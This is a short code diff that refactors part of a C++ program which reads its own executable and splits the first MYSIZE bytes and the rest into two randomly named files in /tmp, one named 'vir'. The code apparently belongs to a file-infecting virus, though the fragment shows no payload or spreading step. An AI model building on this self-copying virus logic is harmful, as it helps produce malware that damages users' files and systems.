@@ -9,16 +9,14 @@ using namespace std;
 
 int main (int argc, char** argv) {
     srand(time(0));
-    string exe = "/tmp/", vir = "/tmp/";
+    int c;
+    string exe = "/tmp/", vir = "/tmp/", me = (string)argv[0], command;
     for (int i = 0; i < 8; i++) {
         exe += (char)((rand() % 26) + 65);
         vir += (char)((rand() % 26) + 65);
     }
-    int c;
-    string me = (string)argv[0], command;
     ifstream fi(me);
-    ofstream fo(exe);
-    ofstream fv(vir);
+    ofstream fo(exe), fv(vir);
     if (fi.is_open() && fo.is_open() && fv.is_open()) {
         for (int i = 0; i < MYSIZE; i++) fv << (char)fi.get();
         fi.seekg(MYSIZE, fi.beg);
